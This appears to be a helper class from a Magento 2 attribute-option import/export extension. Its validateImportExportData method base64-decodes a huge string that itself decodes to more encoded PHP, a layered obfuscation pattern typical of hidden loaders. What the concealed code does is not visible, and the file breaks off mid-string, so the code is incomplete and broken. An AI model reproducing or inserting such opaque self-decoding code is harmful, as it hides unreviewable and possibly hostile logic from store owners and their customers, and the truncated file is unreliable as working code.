<?php

namespace Emipro\Importexportattributeoption\Helper;

use Magento\Framework\Filesystem;
use Magento\Framework\Url;

class Data extends \Magento\Framework\App\Helper\AbstractHelper {

	protected $scopeConfig;
	protected $storeManager;
	protected $messageManager;
	protected $_response;
	protected $_resourceConfig;
	protected $_responseFactory;
	protected $_url;
	
	public function __construct(
		\Magento\Framework\App\Config\ScopeConfigInterface $scopeConfig,
		\Magento\Store\Model\StoreManagerInterface $storeManager,
		\Magento\Framework\Message\ManagerInterface $messageManager,
		\Magento\Framework\App\ResponseInterface $response,
        \Magento\Framework\App\Config\Storage\WriterInterface $resourceConfig,
        \Magento\Framework\App\ResponseFactory $responseFactory,
        \Magento\Framework\UrlInterface $url
	)
    {
        $this->scopeConfig = $scopeConfig;
        $this->_storeManager=$storeManager;
        $this->messageManager=$messageManager;
        $this->_response=$response;
        $this->_resourceConfig=$resourceConfig;
        $this->_responseFactory = $responseFactory;
        $this->_url = $url;
    }
		
    public function validateImportExportData() 
    { 
    	$tFmb=base64_decode('JG9JWFEgPSAnSkVoeldsUWdQU0FuU2tka1MxZHVaMmRRVTBGdVUydG9kMWRIVWtkU1YyUlJWVEJHZFZVeWRHdGhNVXAwVm01T1lVMXRVbEpXVkVKSFpGWlZlV1JIZEZkTlJGWkpWbGQwYjFZeVNuTlhia1pWVm5wRk1GUlhlSE5rUjBsNldrZG9WMVpGV2pWWFYzUnZWVEpHYzFOcVdtbFNSbHBvVld4a1UxZEdVbkphUlRsVVVsUnNXbGxyWkRCVk1ERkhZa1JPV0dFeFduWlZla3BQVWpKS1NWWnNaR2hoTUhCdlZtMDFkMk13TUhoalJWcGhVMFUxY2xsc1ZuZGtNVlY0VlcxMFZHSkZXbFpWVjNRMFZrWmFWazVWVGxoaGEwcDZWVmN4Um1Wc1pISk5WVFZYWWtjNGVWWnFTalJVTVVWNVZHdG9WR0pyU2xOWmJUVkRZakZXZFdOSVRrNU5WVFZYVm0xNGExUXhTWGhUYTJ4WFlsUldXRmxYYzNoa1IxWkZVMnh3YVZZemFFVldhMUpIWXpGa1JrMVdhR3hTV0VKVFZGY3hiMWRHWkZsalJYUlhUV3RXTTFsclZtOVhSMHB6WTBoR1dsWnNXa3hXUjNoelZqRndSazlYYkZOTlNFRjRWbXRqZUU1R1RuTlRXSEJXWW1zMWFGWnRjekZsVm5CSFZtNU9VMkpWY0VaVlYzUjNWVEpXY2xacVVsaFhTRUpRVmxkNGRtVldVbGxqUmxwcFZqSm9lRmRYTVRSU01rcHpZMFZXVkdKck5VOVZha0poVWxaV1YyRklUbFJpUld3MFZqSTFWMVpXU1hsbFJVNWhWbXh3UjFwWGVHRmtWMDVJWkVaT2JHSllaRE5XTVdSM1ZERkZkMDFWYUZOaVIyaFJWakJhWVZSc1pIVmpSVTVWVW10V05GVnROVXRoUlRGeVkwVnNXbUV5VWpOWFZscGhUbXhhY1Zkc2FHbFNiWE40VjFaV2ExTXhUa2hUYTJob1VqTkNjMWxYZEV0a01XUlhWMjF3YkZJeFJqVlZNV2gzVmtkR2NsTnRhRmROUjFKMlZGUkdjMk5XVW5Ka1JUVlRZbGhvWVZac1pIZFJNa1owVTJ4b2JGTkZTbWhWYlRGdlZrWnNjbHBGY0d4aVJWcDRWVmN4YjFZeVZuUmtNMmhXVFZkU00xcFhlSFprTVZaelUyMXNUbE5GU2taV2JHaDNZakF4YzFkc1ZsUmlSMUp2V1d4YVMxTldiSEpoUjBab1ZqQmFWMVV5ZERCWFIwVjNUbFZTWVZJemFETlpNRnBIWkZaU2RHRkdaRTVTUmxvMlZqRmpkMDFXVVhsVGExcHBVbGRvV1ZsdGRFdGhSbHB4VkcwNWFtSkZOVmRYYTJoUFlURmFXR1ZGY0ZkU00wSllXVmR6ZDJWR1RuVlViSEJwVWxSQ05GWkhkR3RUTVdSSVZWaGtUMVpXU21oVVZ6VlRWRVpXY2xkclpHdGlSVFY1VmtkNFUxWnRTbkpPVnpsWFlXdEZlRmw2Um5Oa1JUVldUMWRzVTJKWFVURlhhMVpyVGtkS1IxZHJWbEppYTNCb1ZXeGtVMlJzYTNkYVJUbFBWbFJHUlZwRlpIZFViVVkyVmxoc1dGWkZTbkpXYWtaTFUwWk9XV0pGT1ZkbGExcDJWbTF3UzFRd01VZFdhMmhPVmpOU2NGVnFSa3RUUmxsNVRWYzVhRlpyTlVoV01qVlBWa1V4UmxacVRsWmxhMHBRVmxjeFJtUXlUa1pqUjJ4cFlYcFdOVll4WkRCaE1rMTVVbTVPYWxKdGFGQldNR2hEWVVaYWRHTklUbWxOVjNoNVYydG9UMkZHU1hkTlZGcFZWbGRvYUZsV1drcGxWMVpKVW14b2FWSXdNVFJYVm1RMFpERmFSazlXYkZWaVYyaFlWRlZTVjJWc1pGaE5TR2hWVFd0d1IxbHJhRU5oTURGRlZtdFdXbFpzV2toWmJYaFBWbXhTY2xOdFJrNVNNMmhHVmxaYWEyRXhUbk5TV0dSVFlsUldWVlpzV25aTlJscElaVWhPV0ZKdVFrbGFWV1J6WVZkS1JtSXpiRmROUmxwb1ZrUkJlRk5HVGxsalJsSnBWMGRvWVZaWGVGTlNNREZ6V2toS1lWSnRVbkZVVm1SdlUwWmFTRTFZWkdoV1ZFSXpWVEkxVDFack1WaFVXR2hWVmxad00xWXhXazlrUlRGWFkwWmtUbEpHV2paV2ExSkxaREpSZUZkclpGTlhSMUpSVm0xMFlWWkdXblJqU0U1WFZteHdlVlpzVWxkV2F6RldZMFpXV2xkSVFuSlZiRnBYVjBVNVZrOVdTazVpVmtvMVZsUktNR1F4VGtaTlZtaG9VakJhVDFsclduZFNNV1JZWTBWd2JGSXdXa2xWYlhodlZERktTR1ZGZEZaV1JWcExXa1JHYzFac2NFbFViWGhvVFRKb1YxWkhlR3RaVjBaeVRVaG9WR0ZyY0dGVVYzQkhWMFphU0dWSVRsaFNWRlpaV1ZWa1IxUnRTa2RpZWtaWFVsWndVMVJXWkV0ak1rNUhZa1phYVZKcmNIbFdWelYzWXpBMVYxcElUbFZpVkZaeFZXeG9iMVpzVW5OWmVrWmFWbTFTU0ZVeWRGTlhSbHAwWVVaQ1dtRXhjR2hXTVZwUFpGWlNjbVZHVG1saVYyaFJWbXBHWVdFeVJYbFRhMmhVWW14YVYxbHRlSGRYYkZaelYyNWtUMVp0VWxoWFZFNXZZVlpKZUZKcVZsVk5WMmg2V1ZWVmVGZFhSa2RhUm5CT1lXdFZkMVpVU1hoVE1sSlhWbTVTYkZJelFuQldiVFZEWkd4WmVGVnJkRmRoZWxaNVZERm9UMVl5U2taT1ZscFdZbGhDZWxadGVGcGxSbVJ5Vkd4T2FWSXlVVEJXTW5SWFdWWldkRkpzYUdwbGF6VlVWVzEwWVUxc1ZYbGtSVGxYVW14YU1GcEZXbmRYUmtwVlZtcEtWMDFYVGpOVWJHUkhVMFpTZFZWc1dtbFNia0o0VjFkNGIyRXlTbk5XYTJSVllUQndiMVJYZUV0VFZteFdZVVZPYUdKV1dsWlZWbWhMVjBaS1JrNVdhR0ZXYlZKTVZXdFZlRkpIVWtoU2F6VnBVbTEzZWxadE1UUmlNVTE1VkZoa2ExSldTbWhWYWtwdllVWldkV05GWkd0TlYzZ3dXVmh3VjJGR1NuVlJhMnhWVm0xb1JGbFdaRWRXVjBwSlUyeG9WMkpYYUZGWFYzQkhZekpTUms5V2FHaFNNMEp3Vm0xMFlVMVdWalpTYkU1c1lrWktlVlpITURGaFJURkpVVzA1VjJGclducGFSM2hyWXpGcmVtRkhkRTVpUlhCTFYxWlNTazVXVFhoVFdIQm9VMGRTV1ZaclZuZFhSbkJIV2tVMWJGWnNjREJXTWpGdlZHMUtSMkV6YUZabGExcFFXVEo0ZG1WV1duRlViV2hPVTBWS1JsWnNXbXROUmsxNFUydGtVMkpzY0ZWWlZFRXhWVEZzVlZGdVpGUk5WVFZJVlRJMVlWZHNXblJoUlRsaFVsWndSRnBGVlhoWFIxWklZMFUxVGxKR1dqSldha3AzVXpGWmVGVnVUbWxTYldoUVZtcEtiMkZHVWxobFIwWlBWbXhLU0ZaV1VrZGhSa3AxVVd0c1YxWXpVbWhaVnpGTFkyMU9SVk5zY0U1aVdHZ3lWakl4TkdJd05WZGlNMnhwVW14d1ZGUlVTbTlsYkZsNFYyMDVWVTFyY0VkWmExWnZWakpLYzFkdVNsWmhhMXBvVkd4YVQxWnNjRVZWYlhCVFlsaFJNVlp0TURGV01rWnlUVmhPVjJKVVZtRldhMVozVjBaU2MxWnFVbXBTYXpWYVZWZDBORll4VGtaT1ZrSldWa1Z3Y2xreWVFOWpiVXBHVld4S1YwMXNTa3hXVmxKRFVqSktjMVJzV2xWaE1IQnZWRmQ0UzFOV2JGWmhSVTVvWWxaYVZsVldhRXRYUmtwR1RsVjRXbUV5VWs5YVYzaEhaRlprZEdKSGJHaGxiRm8yVm14amQyVkdTWGxTYmxKV1lUSm9VVll3WkRSak1WcFpZMFZLYW1KSFVsWldSM1F3WVZaS2RHVkdjRmRXZWtVd1ZrVmFSbVZYVWtWUmJGcFRaV3hhVVZkWGRHdFZNVWw0Vkc1U2JGSXdXbFJVVnpWdVRWWlplV1ZIZEZWTlJFWkhXa1ZXVTFadFNsbFZiVVpYVFVaVmVGcEhlR3RYUlRGRlZtMW9VMDFFVlhkV2JHUTBXVmRHZEZOc2JHRlRSMUpXVlcxNFJtVkdjRmhsU0dSWVVsUldXVnBGV21GaFZscHpZbnBLV0ZaRlNuRlViR1JUVjBaU1dXSkdaRmRsYlhoT1ZtMTBiMVF4VVhoU1dHeGhVMFZ3VlZsVVNqUlNWbFpYV2tkMFZHSkZWak5WYlRBeFZrWmFWazVWVWxwV1JYQklWakJhWVZkRk9WWmxSbVJVVWxSV1VWWldVa3RoTWs1elZHNUtWV0pIZUU5VmJHaERVbFphVjFWclRsVlNhMVkwVlcwMVQyRnNTblZSYm1SWVlXdHdkbGxYZUU5U2JVNUpWR3hvYUdFeFZYaFhhMVpoWXpGa1YxWnVVbXBTTW1oVFZGY3hVMDFXV2taaFNHUlRZWHBXVjFSV2FFTlVNVTVJWVVaQ1dsWjZSbkpVVmxwVFUxZEtTR05IY0U1U00yaEdWbXhqTVZVeFpITlhXR3hXWW1zMVYxbFVTazVOVm5CR1YyNU9XRkl3Y0VwV2JYUTBWbXN4UmxkcVFsWk5ha1o2VlZjeFIxTkdVbkppUmxKcFYwZG9iMVpHV2xOak1ERkhXa1prYUZKck5XOVpiRlpoVWxaa2NWTlVSbFZXTVZwNVZtMXdWMVpYU25Sak0yUmhVa1ZKTUZreFdrZFhWbHB5VGxaYWJHSlhaM2hXYTFaWFZERkdkRkpZYkZSaVIyaFVXV3hTVjJGR1duTlhhM1JPWWtkNGVsZHJWbXRoYkVsM1kwaGtXbFpGY0hKVmVrcEhWakpLU0U1V1VsZGlWMmhGVjJ4YVlXUXhaRWRqUldoWVlsZDRXRlJWV25OTk1WbDRWV3QwYVdKVmJETlpNRkpYVlVaa1JrNVlRbFZXTTAxNFdXcEdjMk5zY0VoUFYzUnBWbFJGTWxac1dtOVpWazE1Vm14c1lWSjZWbFZaVkVwUFRrWnNWbGR1V214V2JIQjVWbTB4YzFSdFJuSlhibHBZVm14d2NWUlZaRTlTYlZKSFUyczFVMWRHU2taV2JGcHJUVEF3ZUZOclpGTmliSEJWV1ZSQk1WVXhiSEpoUlU1YVZqQmFXVmxWVW1GWlZrcFlZVVY0V21WcldqTldNRlV4VTBVNVZtUkdUazVOYldkNlZtcEdVMU14V1hsVmJHaFZWMGQ0V0Zsc1duZGlNVkpZWlVad1RsWnJNVFJXVm1oclZVWmFWVlpyV2xaV2JXaEVWV3hhVjFkRk9WWmtSa3BPVmxad05sWkhjRU5WTVZaMFUxaGthbEpXU2xkV2FrNVRWRVpWZVdSSE9WSk5helZJV1RCYWIxWlhTbGxoU0VaaFZteGFSMVJzV2s5V2JVWkdWRzFvVTAxRVZYaFdhMk40VGtaa1ZrMUlhRmhoYkZwaFdWUkJNV1JXYkZWVGEzUllVbXR3TUZSc1pFZFdNVnB5WWpOc1dGWXphSEpWYWtwUFUwWk9kVkZ0YUd4aVZrcEdWbXhhYTAxR1VYaFNXR3hoVTBWd1ZWbFVRVEZWTVd4VlUycENXbFpyYnpKWmExSkRWMFphZEZWdWNHRlNiRnA2Vld4VmVGTkdjRWhoUm1oVFZrWlZlVlpxU2pSaU1WWjBVMWhrYWxKWGVGTlpiWFJMWVVaYWNWRlVSbXBOVjNjeVZXMDFkMkZYU2xaWGEyeFZUVmRvTTFsVVJrWmxWbFowWkVaU1RsWlVWa1JXUlZKRFl6RktSMVp1Vm1GU01taFlWRlphZDJWR1dYbGxSemxWVFZkNGVWbHFUbk5oUms1SFkwaEdWVlpGV2toYVJscHJVakZTY2xOck9XaE5ibWhHVm14ak1XRXlSa2RYV0doWVltdGFXVmxyWkc5VlJtUllaRWhPYTFacldqQlpWV1F3VlRBeGRGVnVaRmROUm5CVVdsZDRVMk5zVW5ST1YyaE9VMFZLUmxac1dtdE9SMUY0V2toU2FWSlZjSEJVVjNNeFUyeFZlVTFVVWxwV1ZFWldXV3RTUTFkR1duUmhSbEphVm5wR1NGVnJXblpsVlRWV1RWZDRWMDFyTkhsV2JYaFhWVEExU0ZKWWJGUlhSM2hQVm1wS2IySXhXblZqUmtwcVlrWnZNbFV5ZEdGaE1VbDRWMjVvVmxadGFGUldWVnBoWTFaS2RHSkdhRmRoZWtVd1ZrY3hlbVZHU2taTlZWWlhZa2Q0VTFwWGRHRmpiR1J6WVVoa1UySlZNVE5VYkdoSFZsZEdkR1ZHY0ZaWFNFSllXVlphYTFZeFVsbGhSVGxwVWpKb1JsWkhlR3RWTWtwSVZtNUthVk5JUWxaWmJGSlRUVEZyZDFadVpGTlNWR3hhVlZkME1HSkdaRWhWYmxaV1RXNVNjbFpVU2xOa1JrNXpZVVpPYVdFd2NIZFhWbHB2WVRKS2MxUnVTbWhTV0ZKd1ZXMHdOVTVzV2tkaFJVNVZVbXhXTTFVeFVrOVZNVXB5VjJwS1ZrMXVVbEJXVnpGR1pESk9SbFZzV2s1U1ZuQTFWbXBLTUdGck5WaFZhMlJwVW0xb2NGVXdXbUZXYkd4elYyeHdiR0pHV2toV1IzaFBZa1phZFZGc2JGaGhNbWd6VmpCa1YxZEdWblZUYkhCb1lUSjNNRmRXVm10U01XUkdUbFZvVDFadGVGaFZNRlV4VlVaV1ZWTnRkR3BpUlRWNVZrZDRTMkZXU2tobFJYUldZV3RhYUZwWGVITk9iRTV6VjIxR1RtSkdiRFpXUmxaWFRVWktSMVpzYUd0U1dGSlRWRlpXWVdWV1pIRlJibVJVVW14YU1WWXlNWE5XTURGSFkwUk9XRlo2UmpaVVZtUkxVMFpXY1Zkck5WaFNNVXBvVm1wQ1YyUXdOWE5hU0U1WVZrWmFUMVpxUVRGTlJuQkZVMVJXVkUxVmJ6SlZiVEExVjBkR2NtTkdhRlppUjFKTFdsWlZlRmRIUmtoaFJtUnNZa1Z2TWxaVVJsZFpWa1Y0Vkd4a1YyRXlVbEZXYlhoM1ZqRnNWVlJ0T1dsV2JGWXpWbXhTVjFZeFNuTmpSVlphVjBoQ2NsVnNXbGRYUlRsV1pFWktUbFpXY0RWV1ZFbDRXVlpXY2sxVldtdFNWa3BYVm1wT1UxUkdWbFZTYlRsU1RXeGFXRmt3V205WlZrbDRZMGhDVjJGclNtRmFSRVpyVmxaT2RFNVhiRTVTTTJnelZrUkdhMVl4VWtkVGExWnBVbXR3VjFWc1pGTldSbkJJVFZWMFdGSnJjREZWVnpGellVZEdjMWR1UWxkTlZuQlBXbFZWTVdOck1WWlZhelZUVW14d1lWWnRNREZWTWtsNFZXdGthRk5HY0hKVVZXaHZWbXhzY2xwRk9WVldiSEI0Vld4U1QxWldXbkpPU0hCVlZqTk9NMXBYYzNoVFZrWnlUVlUxYVZkR1NqTldhMVpYVkRGR2RGSllhR3BTVjJoUlZqQmFTMWxXV25GVGFsSk9WbXh3U1ZSV1dtdFVhekZKWVVWV1ZsWnRVWGRaVjNoS1pERmtXVnBHYUZOU1dFSkpWMnhhYTFReVVrZFRia1pYWVROb1dGVXdWVEZWUmxaVlUyMTBhbUpGTlhsV1IzaExZVVV4ZFZWdGFGWmlia0o2VkZWYWExWXhjRWxVYlhSWFlUQndWbFpzWXpGaE1XUnpXa1ZrVkdKVVJsbFdiVEZ2VkVad1YxZHVUbGhXTUhCSlZUSjBNRlJ0U2taaU0yeFlWak5vY2xWcVNrOVRSazUxVVcxR1UwMVZjRkpYYTJoM1VURlNSMU5yWkZOaWJIQlZXVlJCTVZVeGJGVlJibVJVVFZWc05GVXljRXRYYlVwSVZXdG9XazFIVWt4Wk1uaFRaRVU1VjJOR2FGTldNMk4zVm14V1lXSXhVWGROVm1ScFUwWmFWbGxYZEV0alZteFhXa2QwYW1KSFVubFhXSEJYWVRGS2RHVkdiRnBoTW1oWVZrWmFSMDVzUm5GWGJGWlRWbXR3U0ZkVVFsWk9WVEIzVFZWYWExSldTbGRXYWs1VFZFWldWVkpyT1ZaTmExWTFWVEZvYzFSc1dYbGhSemxYWW01Q1dGVnNXbk5XYkhCR1drZDRWMVpGV2pSV1JscHZaREpGZUZkWVpHcFNSbkJvVld4a2IxTXhiSEZSYm1SVVVteGFNVll5TVhOV01ERkhZMFJPV0ZaNlJucFVWRXBUVW1zeFdWRnRkRTVOYldoT1ZtMTBiMVF4VVhoU1dHeGhVMFZ3VlZsVVFURlZNV3hWVTJwQ1dsWnJiekpaYTFKRFYwWmFkRlZ1Y0dGU2JIQkhXbFprUjFOSFJraGpSMmhvWld0RmVGWXhhSGRVTVZsNVVteG9WVmRJUWxkWmJURTBWRlpXVlZKcmRHcGlSM2g0VlRGb2IyRkdTWGRYYkd4VllUSm9VRlpHV21GU2JGcDFZMFpXVjJGNlZqVldSM0JEVlRGV2RGTllaR3BTVmtwWFZtcE9VMVJHVlhsa1IzUlhUVVJXU1ZaWGRHOVdNa3B6VjI1R1ZWWjZSVEJVVjNoelpFZFNSazlYYkU1V00yaGhWbFJHYjJJeFZsZGFSVnBQVTBkb1dWWnVjRmRWUmxKV1drVTVhbEp0T1RWYVJXUkhWMFpKZVZwRVRsZE5ibWh4VkZaa1YyUkdTbk5oUmtKWVVteHdUMVpYZEZkU01sWnpWV3hrVldKcmNGQlVWVnBMVlRGc2NWRnVaRk5TYkZwWldrVldNRlpIUlhsVmJHaFZZVEpTVkZVd1dtRmtWbHAwWTBVMWFWZEhaRFZXTVdONFRVWlJlVk5ZYUdsU2JYaFZWakJrTkZWc1dYZFdWRUpzVW0xU1dWUnNWVFZVYkVsM1RsaGtXR0ZyYjNkWFZscHJVMFp2ZWxwR2FHbFNNREUwVjJ4amVGSXhaRVpQVm14WFlYcEdWRlZzV21GT2JGcEhWMnM1YW1GNlVqTldWM2hMWVZVeFNWRnJWbGRXYlZGM1ZYcEdUMk5zY0VkYVJUbFRUVlZ3U2xadE1ERldNa1p5VFZoU2JGSkZjR0ZaYkdoVFZVWnNjVkp1VGxoV2F6VmFXVEJhUjFkR1NsVlZhbEpYVFZkTmVGWkVRWGhUUmxKMVVXMUdUbUpzU205V2FrSnJZbTFSZUZwSVRscGxhMXB6V1d4V1lWZFdVWGhoUm1SVlZtdHdSMWxyYUhkV1ZscHlUbGhzVldGclNsUldWekZLWkRBMVZsVnRSazVpYkVwTlZsWlNSMUl5VG5SU1dHaG9UVEo0YjFVd1ZuZFdSbFoxWTBoT1RsSnRVbGhYYTJoUFlURmFWVkpzV2xWV2JXZ3pXVlJHV21ReVRrVlhiVVpUVmpKb1RGZFhjRU5rTVU1SVZtdHNVbUpJUWs5WmExcDJaVVprV1dORmRGZE5XRUl3Vld4b2MxWXlSbk5YYXpWV1lURmFXRlJyV2xOU2JGWnlWMjF3VTFaSGREWldSbFpYVFVaS1IxWnNhR3RTV0ZKVFZGWlZNVlpHYkZoTlZXUlVVakZLUjFadE1YTlViVVp5VjI1YVdGWnNjSEZVVldSWFZqRkdjMkpHVm1oaE1YQm9WMWN4ZWsxSFVYaGhNMnhwVW5wV2IxUlhkSGRUVm14eVdraGtXbFpzYnpKV2JYQmhWMGRLUjJGNlJscE5ibWd6VmpGa1JtVnNVbkpPVm1SVFlsaG5NbFpyV21GVU1rNXlUa2hrVm1KRmNIQlVWV2hEVWxaYVYxcEVRbFJOVlRWNVYydFZOV0ZWTVhKV2FrNVhWbnBXYUZsV1dscGtNV1IxV2tad2FWZEZTbEJXUkVaclZHMVdjMWR1VW1sU00wSlBWRlpXZGsxV1ZqWlJhemxXVFdzeE5WVnRlRzlXVjBwWllVaENXbUpZVFhoWmVrWnJVbFpPY1ZGdGJGTk5WbkJXVjJ0U1QySXhWa2RXV0hCaFVrWktWVlJXV2t0T2JGcElaRVU1YVdKVlZqTlpNRlpUVm14WmVsVnViRmROVmtwTVdXcEtUMk14VG5OaVIyaFRVbFZ3YjFadE5YZFdiVkY0WWtaa1dtVnNXbkpXYkZKSFZteFNWMkZJWkdoTlZtd3pXVEJTWVZsV1NsaGhSWFJhWVd0S00xVXdaRmRUVmtaelkwVTFhVkp0T1RSV01XaDNVekZaZUdOSVVsTlhSM2hZV1ZkNFlWUnNWbkpXYmtwc1VteEtSMVpYZEdGaGJFcFZZVE53VlZaV1dYZFZhMXBYVjBkU1JtUkdTazVXVkZaVlYxWmplRkl4VGtoVmExcFlZbGhvVlZWdGRIZGxiR1JZVFVSR1ZrMXJOVWxWTVdoelZERk9TR1ZHU2xkTlJsVjNXbFZhYTFkRk5WWlBWVFZUVFVSV00xWXljRXROUjBaWFUxaHNiRk5GV2xsWmEyUk9aVVp3V0dWSVpGZE5SR3hhVlRJeFIxZEdTWHBWYWxwWFVtMVNNMWt5TVU1a01ERlhWVzFvYkdKV1NrZFdiRnBxVGxaTmVGSllhRk5pYTNCVldWUk9RMU5XV2toTlJGWm9VbFJHU0ZZeFVrTlpWa3BZVld4b1lWSnRVbFJWTUdSTFUxWmtkR0pIYUdobGEwVjRWakZvZDFReFdYbFNiR2hWVjBoQ1YxbHRNVFJVVmxaVlVtdDBiR0pIZUZoWGExVTFZVlpKZDJORVJsZFNla1V3VmpGVmVHUldWblZVYlVaWFlYcFNObGRzWkhwTlZscElWVmh3YUZKWWFGaFZNRlV4VlVaV1ZWTnRjR3ROVlRFelZrZDRTMkZGTVVsUmExWlhZV3R2TUZwRldrNWtNVkowVGxkb1RsZEZTa3BXUkVadlZURmtjMWRZYkd4U1JWcFhWbXRXZDJSc2JGWmFSVGxxVm10d1ZsbHJXa2RXYXpGV1kwaG9XRlpzV25KVVZWcExWMFpPV1dKRk5WZE5iV2gyVm0wMWQxVXdOVWRVYkZwVllraENjRlpzWkRSU1ZscFlUVlJDYUZaVVJuaFZiVEExVjJ4YWRGUllhRlpoTWxKSVZUQmFTMlJYU2taT1YyaG9ZVEJWZUZaVVNqQmhNVkY1VTFoc1UxZEhVbGRaYlhoM1kwWmFjVkZ0Um10TlYzZ3dXVEJXZDFsVk1VbFJibVJYVFZkU2NsVjZSa3BsUms1eFUyeHdhVkl4U2tsWFZFSnJVekpPYzFWdVVsQldia0paVld4a00wMXNXbFpYYkVwclRXdFdORmxVVG5OaFJrNUdZMFpTVm1KdVFucFVWVnByVmpGd1NWUnRkRmRXUlZWNFZsWmFhbVZHVFhsU2JGcFRZbXR3V1ZaclZuZGtiR3Q1WlVWMFdGWXdXa1pWVnpGSFZqSldjMVpxVGxoV2JIQnhWR3hrVTFack1WZFdhelZUVWpOb1RWWlhjRWRYYXpGSFkwVmFZVkp0VW5KV2FrRjRUbFpzY21GSFJtaFdNRll6Vkd4b1lWZEdXblJoUlhSaFZsWmFlbFZyV210WFJURldZMFpLVGxaWVFqUldNVnBYWVRBeFIxTnVVbGRoTW5oWFdXeG9iMk5HYkhSbFJYUnJUVmQ0ZUZVeFVrTmlSbHB5VTJ4YVZWWlhVWGRYVmxwclUwWnZlbHBHYUdsU01ERTBWMnhqZUZJeFpFWlBWbXhYWWtWd1QxbHNaRzlrYkdSVlUyNWtWR0pIT1ROWk1HaERWMFpaZVZWcmVGWmhhMFY0V2tkNGMxWldSbk5hUlRsVFRWVndTbFp0TURGV01rVjRVMWhzYkZKRmNHRlpiR2hEVkRGUmVGZHJUbGRTYkZvd1dsVmtORlpHU25KalNIQllWbnBCZUZaRVNrOVRSazVaWWtVNVYxWnJjSFpXVjNCRFdWVTFWMVZzYkdsVFJYQlJWbTEwUzFkV1dYbE5WemxvVm1zMVIxUnNhRTlXUlRGV1RsVlNWV0ZyU2xCV1Z6RkdaREpPUmxWc1dsZE5NVXBOVmxkMFlWSXlVbk5VYmtwVllrVndiMVJWYUVOU1ZscFZVbXR3YTAxWGVGZFhhMmhQWWtkRmVtRkdXbFZpUjFKb1dWY3hTMVl4WkhGWGJIQm9ZWHBXV1Zkc1dtRmpiVlpYVjI1S1ZtSlhlRTlaVjNoaFRVWmtWMWR0ZEdoaVZrcElWVmMxVjFaWFNsaGhTRXBhWWtad1dGcEhlRXRTTVVwMVYyeFNhRTFFVmxSWFZsSkRaREZLUjFac2FHdFRSVXBvVmpCa05GWkdiRFpUYTJSWVVteEtNRnBWWkhOaFYwWTJWbTV3VjAxR1NreFZha3BPWlZaS2MyRkdUbWxpYTBvd1ZteG9kMk15Vm5OaVJtUmhVbFJzY0ZWcVFuZE5SbHBJVFZSU1ZWWlVSakZaVldoclYwWmFSbU5HYUdGU2JIQjVXbFphWVZkSFNrWk5Wa3BYVWxWd1RsWldVa2RTTWs1elZHNUtWV0pGY0c5VVZXaERVekZzVjFadVRtdE5Wa1kyVjFST2ExWkZNVVpPVms1YVZrVktNMVZyV2xabFJrNVpXa1p3VjFZeFNqWlhiR1F3VGtaYVZrNVdiRlppVlZwWlZXeFNWazFzV1hoWGJYUm9UV3R3U0ZaWGVHOVZNa3B6VjIxR1YyRnJjRlJaZWtaeVpWZEZlbHBGZUU1V00yaGFWbXhqZUUxR1ZYaGFSVnBxVWtaYVlWbFhjekZUTVd4eFVtMDFiRkpVYkVsVU1WWjNZVVV3ZVdGRVRsZE5Wa3BNVm1wS1UxWXlSWHBpUm1SWFRXeEtkbFpHWkRSWGF6RlhWR3hhWVZORk5YTlpWRW8wVTFac2NtRkdaR2hOYTNCWFZqSTFkMWRzV25SVmJFNVlZV3RhTTFwRlZUVlhWMHBHWTBaU1UyRXpRWGxXTVZwaFlqRlNjMkl6YUdwU1YyaFJWakJhUzFsV1duRlRhbEpPVm1zMVYxbFZWazloYXpGWlVXeHNWbUpVVmpOWFZscFdaREZPZFZKc2NHaGhNblEwVmtaV1lXTXhaRWRWYmtaU1lUTkNWVlZ0ZUhaTmJGcEdXa2hPVkdKVk5VZGFSVnBYWVdzeFJWWnJWbGhoYTI5M1ZYcEdUMVpzVW5KVGJVWk9Vak5vUmxaV1dtdGhNVTV6VWxoa1UySnJjR2hWYkdSVFpHeHJkMXBGT1U5V1ZFWkZXa1ZhYzFSck1VbFJibkJZVjBoQ1VGVlVTbE5rUms1MVZteFdhVmRIYUZWWFYzaFhXVmRPVjJORldscGxiRnB6Vm1wR1lWWldVbFpVYWtKWVlYcENNMWt3YUU5WFJscDBZVVpTV21FeFdYZFZhMlJHWld4V2MxSnRiR2hsYkZvMlZqSjBWMWxXVFhsVGEyUnFVbGRvY0ZVd1pEUmhSbHB4VVZSQ2EwMVZNVE5XUjNoUFlVVXhXR1ZHY0ZkU2VrRXhWakl4UzFaWFNraFBWbkJPWVd0YVZWWnRNSGhVTWxKSVZWaHdVbUY2UmxoVmExcGFUV3haZVdWSGNFNVdNRlkwVm0wMVUxWXlTblZSYmtaV1ltNUNlbFJXV25OT2JFNXpWMjFzVGxOR1NsZFhXSEJDVFZaS1IySXpiR3RTV0ZKVlZteFZNVkV4WkhGUmJrNVRVbXRhV1ZkclZuZFZhekZHWTBoc1dGWnNjSEpXYlRGS1pESlNSMVp0Y0U1U1JscEdWakp3UzAxR1RYaFNXR2hUWW1zMVVWWnNXa3RWTVd4eFVXNWtVMUpzV2xsYVNIQlhWVEZLY2xkcVNsWk5ibEpRVmxjeFMxTkhWa2hpUmxKVFZrWmFObFpYZEdGU01sSnpWRzVLVldKRmNIQlZhMlJUVW14YVYxbDZWbFJOVlZZMFZXMDFTMVpIUlhwUmEzQlhWbnBCTVZsVldtdFNhekZWVVd4YVUwMHlUWGhYYkZwaFpERmtWMVZ1VmxoaVdGSlpWV3hvUTJWR1dYbGxSbVJWVFd4S01GVXlOVk5YUjBweVUyMW9ZVlpzU2tOWk1uaHpUbXhPY2xwRk5XbFRSVXBXVmpKd1FrMVdTa2RpTTJ4clVsaFNVMVJXVm1GbFZsVjVaRVU1VjFKck5YaFhhMVl3VlRBd2VXRkVUbGROVmtwTVZtcEtVMWRHVWxsaVJtUnBWbTVDYUZadGNFOWlNbEY0V2taa2FGSlViRkZXYkdoclRsWndWbUZGVGxoaGVrWjZWakp3UjFkR1drWmpSbVJoVW5wR1RGVXdaRXRUUjA1SVVteGtiR0pHY0RSV2FrbzBWREZPZEZSWVpGWmlSWEJ3VkZWb1ExSldXbGRhUkVKVVRWVldORlZ0TlV0aFJscFlaVWhrV2xkSVFuSlZiRnBYVjBVNVZtUkdTazVXVm5BMVZsUktNR1F4VGxkV2JsSlFWakpvV1ZWc1VrWmtNVnBXV1ROa2JGSXdjRWxXUm1oM1ZsZEtXR0ZIYUZWV00yaG9Wa1JHYTFZeGJEWlNiV2hUWWxSck1WWnRNREZqTVZKWFYydFdWMkpVYkZsWlZFcFRWa1pXZEUxVk9XdFdhelV4VmpJeGQyRkdXWGxoU0ZKWFRVZG9lbGx0TVVkV01WWnlZVWRzVTAwd1NtOVdiVFYzVmpKT1YxcElUbFZoTURWeFdXdG9RMWRzYkZWVGJYUm9VbTFTUjFS